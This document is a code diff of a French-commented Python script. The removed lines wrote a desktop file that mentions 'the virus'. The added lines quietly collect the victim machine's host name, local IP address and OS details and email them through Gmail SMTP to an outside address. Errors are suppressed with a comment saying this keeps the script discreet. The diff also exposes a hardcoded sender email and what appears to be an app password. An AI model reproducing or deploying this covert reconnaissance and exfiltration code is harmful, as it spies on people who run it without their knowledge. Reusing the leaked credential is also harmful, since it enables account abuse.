@@ -1,17 +1,37 @@
-import os
+import platform
+import socket
+import smtplib
+from email.mime.text import MIMEText
 
-# Chemin vers le bureau de l'utilisateur
-bureau = os.path.join(os.path.expanduser("~"), "Desktop")
+def get_system_info():
+    info = {
+        "Nom de l'utilisateur": platform.node(),
+        "Nom du PC": socket.gethostname(),
+        "Adresse IP locale": socket.gethostbyname(socket.gethostname()),
+        "Système": platform.system(),
+        "Version": platform.version(),
+        "Architecture": platform.machine()
+    }
+    message = "\n".join([f"{k}: {v}" for k, v in info.items()])
+    return message
 
-# Nom du fichier
-nom_fichier = "ordre_executer.txt"
+def send_email(subject, body):
+    sender_email = "serveur.astroneer.status@gmail.com"
+    sender_password = "tzcg cxag pfrx yslw"
+    recipient_email = "arthurepk@icloud.com"
 
-# Chemin complet du fichier
-chemin_fichier = os.path.join(bureau, nom_fichier)
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = sender_email
+    msg["To"] = recipient_email
 
-# Contenu du fichier
-contenu = "Ceci est un fichier d'ordre qu'a telecharger le virus dans un endroit secret "
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+            server.login(sender_email, sender_password)
+            server.sendmail(sender_email, recipient_email, msg.as_string())
+    except Exception as e:
+        pass  # Ne rien afficher pour rester discret
 
-# Création et écriture dans le fichier
-with open(chemin_fichier, "w", encoding="utf-8") as f:
-    f.write(contenu)
+if __name__ == "__main__":
+    infos = get_system_info()
+    send_email("Ordinateur repéré", infos)
